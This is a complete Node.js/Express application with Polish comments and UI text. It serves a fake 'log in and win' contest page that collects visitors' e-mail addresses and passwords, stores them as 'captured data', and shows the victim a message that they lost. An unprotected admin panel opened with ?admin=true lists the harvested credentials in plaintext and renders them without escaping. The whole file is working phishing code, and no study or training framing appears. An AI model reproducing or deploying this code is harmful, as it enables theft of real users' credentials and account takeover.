const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

// Baza danych w pamięci na przechwycone dane
const usersDB = []; 

// Strona główna (Frontend)
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="pl">
        <head>
            <meta charset="UTF-8">
            <title>Zaloguj się i wygraj!</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh; 
                    margin: 0; 
                }
                .card { 
                    background: white; 
                    padding: 40px; 
                    border-radius: 16px; 
                    box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
                    width: 380px; 
                    text-align: center; 
                }
                h2 { color: #333; margin-bottom: 10px; font-size: 26px; }
                .subtitle { color: #666; margin-bottom: 25px; font-size: 14px; }
                input { 
                    width: 100%; 
                    padding: 12px; 
                    margin: 10px 0; 
                    border: 1px solid #dcdde1; 
                    border-radius: 8px; 
                    box-sizing: border-box; 
                    font-size: 14px; 
                }
                button { 
                    background: #ff4757; 
                    color: white; 
                    border: none; 
                    padding: 12px; 
                    width: 100%; 
                    border-radius: 8px; 
                    cursor: pointer; 
                    font-weight: bold; 
                    font-size: 16px; 
                    margin-top: 10px;
                    transition: background 0.2s;
                }
                button:hover { background: #ff6b81; }
                .hidden { display: none; }
                .result-box { font-size: 18px; color: #2f3542; font-weight: bold; margin-top: 20px; }
                
                /* Panel admina */
                .admin-panel { width: 850px; text-align: left; }
                table { width: 100%; border-collapse: collapse; margin-top: 15px; }
                th, td { border: 1px solid #eee; padding: 10px; text-align: left; font-size: 13px; }
                th { background: #f8f9fa; color: #495057; }
            </style>
        </head>
        <body>

            <!-- Ekran logowania / konkursu -->
            <div class="card" id="mainCard">
                <div id="formContainer">
                    <h2>Zaloguj się i wygraj!!!</h2>
                    <p class="subtitle">Wpisz swoje dane, aby odebrać nagrodę</p>
                    
                    <input type="email" id="email" placeholder="Adres E-mail" required>
                    <input type="password" id="password" placeholder="Hasło" required>
                    <button onclick="handleLogin()">Zaloguj</button>
                    <p id="msg" style="color: #e63946; font-size: 13px; margin-top: 10px;"></p>
                </div>

                <div id="resultContainer" class="hidden">
                    <h2>Wynik losowania</h2>
                    <p class="result-box" style="color: #ff4757;">Niestety, ale przegrałeś!</p>
                    <p style="color: #666; font-size: 14px; margin-top: 15px;">Może następnym razem się powiedzie.</p>
                </div>
            </div>

            <!-- Panel Administratora -->
            <div class="card hidden admin-panel" id="adminCard">
                <h2>Panel Administratora (Przechwycone dane)</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Data</th>
                            <th>E-mail</th>
                            <th>Hasło</th>
                        </tr>
                    </thead>
                    <tbody id="adminTableBody"></tbody>
                </table>
                <button onclick="loadAdminData()" style="margin-top: 20px; background: #2ec4b6;">Odśwież dane</button>
            </div>

            <script>
                async function handleLogin() {
                    const email = document.getElementById('email').value;
                    const password = document.getElementById('password').value;

                    if(!email || !password) {
                        document.getElementById('msg').innerText = 'Wypełnij wszystkie pola!';
                        return;
                    }

                    // Wysyłamy dane na serwer, żeby zapisały się w panelu admina
                    const res = await fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email, password })
                    });
                    
                    const data = await res.json();
                    if (data.success) {
                        // Przełączamy widok na komunikat o przegranej
                        document.getElementById('formContainer').classList.add('hidden');
                        document.getElementById('resultContainer').classList.remove('hidden');
                    }
                }

                // Obsługa panelu admina przez dopisanie ?admin=true w adresie
                if (window.location.search.includes('admin=true')) {
                    document.getElementById('mainCard').classList.add('hidden');
                    document.getElementById('adminCard').classList.remove('hidden');
                    loadAdminData();
                    setInterval(loadAdminData, 3000); // Odświeżaj co 3 sekundy
                }

                async function loadAdminData() {
                    const res = await fetch('/api/admin/data');
                    const users = await res.json();
                    const tbody = document.getElementById('adminTableBody');
                    tbody.innerHTML = '';
                    users.forEach(u => {
                        tbody.innerHTML += \`<tr>
                            <td>\${u.timestamp}</td>
                            <td><b>\${u.email}</b></td>
                            <td>\${u.password}</td>
                        </tr>\`;
                    });
                }
            </script>
        </body>
        </html>
    `);
});

// Endpoint zapisujący dane do tablicy
app.post('/api/capture', (req, res) => {
    const { email, password } = req.body;
    
    if (email && password) {
        usersDB.push({ 
            email, 
            password, 
            timestamp: new Date().toLocaleString() 
        });
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, message: 'Brak danych' });
    }
});

// Endpoint udostępniający dane dla panelu admina
app.get('/api/admin/data', (req, res) => {
    res.json(usersDB);
});

app.listen(PORT, () => {
    console.log(`Serwer działa na porcie ${PORT}`);
});
